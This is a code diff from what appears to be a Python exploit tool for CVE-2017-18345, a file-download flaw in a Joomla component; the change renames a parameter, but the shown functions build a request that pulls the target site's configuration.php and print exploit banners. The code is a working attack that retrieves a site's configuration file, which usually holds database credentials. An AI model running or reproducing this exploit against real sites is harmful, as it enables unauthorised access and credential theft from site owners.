@@ -19,17 +19,17 @@ class TerminalColors:
     white = '\033[37m'
     default = '\033[0m'
 
-def exploit_cve_2017_18345(target):
+def exploit_cve_2017_18345(profile_url):
     try:
         download_path = "index.php?option=com_joomanager&controller=details&task=download&path=configuration.php"
-        full_url = target + download_path
+        full_url = profile_url + download_path
 
         try:
-            base_url = urlparse.urlparse(target).path
-            clean_url = target.replace(base_url, "")
+            base_url = urlparse.urlparse(profile_url).path
+            clean_url = profile_url.replace(base_url, "")
             response = requests.get(clean_url, verify=False)
         except:
-            response = requests.get(target, verify=False)
+            response = requests.get(profile_url, verify=False)
 
         file_response = urllib2.urlopen(full_url)
         soup = BeautifulSoup(response.content.decode('utf-8', 'ignore'), 'html.parser')
@@ -45,13 +45,13 @@ def exploit_cve_2017_18345(target):
         print(TerminalColors.cyan + "[*] Exploit Path: " + download_path)
 
     except Exception as e:
-        print(TerminalColors.red + "[!] Exploit failed for target: " + target)
+        print(TerminalColors.red + "[!] Exploit failed for Target: " + profile_url)
         print(TerminalColors.red + "Error: " + str(e))
 
-def scan_cve_2017_18345(target):
+def scan_cve_2017_18345(profile_url):
 
     print(TerminalColors.green + "[*] Starting Exploit..." + TerminalColors.default)
-    exploit_cve_2017_18345(target)
+    exploit_cve_2017_18345(profile_url)
     print(TerminalColors.green + "[*] Exploit Complete" + TerminalColors.default)
 
 
